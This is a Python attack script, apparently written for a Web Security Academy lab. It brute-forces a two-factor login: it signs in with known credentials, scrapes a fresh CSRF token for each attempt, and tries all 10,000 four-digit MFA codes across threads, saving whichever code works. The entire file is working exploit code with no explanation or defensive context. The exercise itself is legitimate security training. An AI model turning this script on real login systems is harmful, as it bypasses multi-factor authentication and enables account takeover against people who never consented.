#! /usr/env/python3

import requests
import itertools
import string
import time
import re
import threading
import random
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

base_url = 'https://0a7a00dd04634f8d80d5865700ec0050.web-security-academy.net'
csrf_regex = re.compile('csrf.+value="([A-Za-z0-9]+)"')
pre_action_counter = 0
SIGNAL = False

def get_pin_guesses(length=4):
    return list(map(lambda x: "".join(x),list(itertools.product(string.digits, repeat=length))))


def pre_action(challenge=None):
    pass

def action(chunk):
    global SIGNAL
    for x in chunk:
        print(f"[>] Bruteforcing: {x}", end='\r')
        session = requests.Session()
        session.proxies = {'https':'http://localhost:8080'}
   
        response = session.get(f"{base_url}/login", verify=False)
        csrf_token = csrf_regex.findall(str(response.content))
    
        if len(csrf_token) == 0:
            print("[x] cannot login!")
            exit(1)
        csrf_token = csrf_token[0]
        response = session.post(f"{base_url}/login", data=f"csrf={csrf_token}&username=carlos&password=montoya", verify=False, allow_redirects=False)
    
        if response.status_code != 302:
            print("[x] Cannot login!")
            exit(1)
    
        response = session.get(f"{base_url}/login2", verify=False)
        csrf_token = csrf_regex.findall(str(response.content))
        
        if len(csrf_token) == 0:
            print("[x] cannot login!")
            return False, True
    
        csrf_token = csrf_token[0]
       
        response = session.post(f"{base_url}/login2", data=f"csrf={csrf_token}&mfa-code={x}", verify=False)
        
        if response.status_code == 302:
            SIGNAL = True
            print()
            print(f"[!] Found {x}")
            with open('result.txt', 'w') as f:
                f.write(x)
    
        if SIGNAL:
            exit(0)

  
if __name__ == '__main__':
    found = False
    shuffle = True
    sleep_time = 0.5
    threads = 10
    pin_guesses = get_pin_guesses()
    chunks = [pin_guesses[i:i + threads] for i in range(0, len(pin_guesses), threads)]
    if shuffle:
        random.shuffle(chunks)
    for chunk in chunks:
        threading.Thread(target=action, args=(chunk,)).start()
        time.sleep(sleep_time)

